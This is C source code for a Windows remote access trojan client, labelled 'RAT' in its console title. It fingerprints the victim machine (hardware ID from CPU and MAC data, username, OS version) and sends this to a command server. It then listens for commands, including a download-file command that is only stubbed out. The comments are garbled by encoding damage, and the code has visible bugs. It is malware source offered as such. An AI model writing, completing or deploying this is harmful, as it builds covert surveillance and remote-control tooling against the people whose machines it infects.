#include "winsock2.h"
#include "intrin.h"
#include "ntdll.h"
#include "iphlpapi.h"
#include "stdio.h"
#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "ws2_32")
#pragma warning(disable : 4996)

SOCKET Socket;

//��������� �������� ��������� �� �������
struct CLIENTS
{
	SOCKET NUMBER; //��� ���� �� ��������� �� �����, ��� ��� ��� �� �����
	char USERNAME[100]; //���� � ������� �� ��������� ��� �����
	char OSVER[100]; //���� � ������� �� ��������� ������ ��
	char HWID[100]; //���������� ���� ��� ����� �����
};

struct DLE
{
	char URL[1000];
};

//��������� �������� ��������� �� �������
struct CMDiDATA
{
	DWORD CMD; //��� � ��� ����� ������ �������
	char DATA[1000]; //� ��� ������ ������� �� ����� ������� ��� ��������� �������
};

void GetHwid(char** hwid)
{
	int CPUInfo[4];
	PIP_ADAPTER_INFO pAdapterInfo;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen;
	wchar_t mac[8] = { 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2 };
	__cpuid(CPUInfo, 0);
	dwBufLen = sizeof(AdapterInfo);
	GetAdaptersInfo(AdapterInfo, &dwBufLen);
	pAdapterInfo = AdapterInfo;
	do
	{
		int i;
		for (i = 0; i < 8; i++)
		{
			mac[i] = mac[i] + pAdapterInfo->Address[i];
		}
		pAdapterInfo = pAdapterInfo->Next;
	} while (pAdapterInfo);
	*hwid = (char*)realloc(*hwid, 100);
	wsprintfA(*hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
		CPUInfo[0], CPUInfo[1], CPUInfo[2],
		CPUInfo[3], mac[0], mac[1],
		mac[2], mac[3], mac[4],
		mac[5], mac[6], mac[7]);
}

void GetUsername(char** username)
{
	DWORD size = UNLEN + 1;
	*username = (char*)realloc(*username, UNLEN + 1);
	GetUserNameA(*username, &size);
}

void GetOS(char** os)
{
	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
	*os = (char*)realloc(*os, sizeof(DWORD) * 12);
	wsprintfA(*os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
}

DWORD WINAPI DLEFUNC(LPVOID url)
{
	char *urlarrdfile = (char*)url;
	printf("na4inau ska4ivanie faula: %s\n", urlarrdfile);
	return 0;
}

DWORD WINAPI RecvThread(LPVOID param)
{
	while (TRUE)
	{
		CMDiDATA indata; //������� ��������� ���������� �� ��������
		memset(&indata, 0, sizeof(CMDiDATA)); //�������� 
		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //����� ��������� �� �������
		{
			printf("cmd recv cmd: %d\n", indata.CMD);
			switch (indata.CMD)
			{
				case 1://���� indata.cmd == 1
				{
					DLE dle; //�������������� ��������� DLE
					memset(&dle, 0, sizeof(dle)); //������� ��
					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //� �������� � ��� indata.DATA
					printf("url: %s\n", dle.URL); //���������� ��������� ���
					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
					break;
				}
				default:
					break;
			}
		}
	}
}

//������� ����� ����� ������ �������
int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	AllocConsole();

	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	SetConsoleTitleA("RAT");

	//�������������� ��������� �������
	struct WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);
	SOCKADDR_IN ServerAddr;
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ServerAddr.sin_family = AF_INET;
	//������ ������ �� ��������� � �������������� �����
	ServerAddr.sin_port = htons(80);
	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	//������������ � �������!!!
	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
	{
		//���� �� ������������ �� �������� ��������:)
		CMDiDATA indata; //������� ��������� ���������� �� ��������
		CLIENTS client; //������� ��������� ���������� �� ���� � �������
		memset(&indata, 0, sizeof(CMDiDATA)); //�������� 
		memset(&client, 0, sizeof(CLIENTS)); //��������
		
		char* hwid = (char*)malloc(0);
		char* user = (char*)malloc(0);
		char* os = (char*)malloc(0);

		GetHwid(&hwid);
		GetUsername(&user);
		GetOS(&os);

		memcpy(client.HWID, hwid, sizeof(client.HWID));
		memcpy(client.USERNAME, user, sizeof(client.USERNAME));
		memcpy(client.OSVER, os, sizeof(client.OSVER));
		indata.CMD = 0;
		memcpy(indata.DATA, &client, sizeof(CLIENTS));
		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
		printf("sended data :: %s %s %s %s\n", client.HWID, client.OSVER, client.USERNAME);
		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //������� ���� ������� ����� ���������� ��������� ��������� �� �������
		WaitForSingleObject(RECV, INFINITE); //���������� ������� ���� ���� ���� ��������...
		//closesocket(Socket);
	}
}
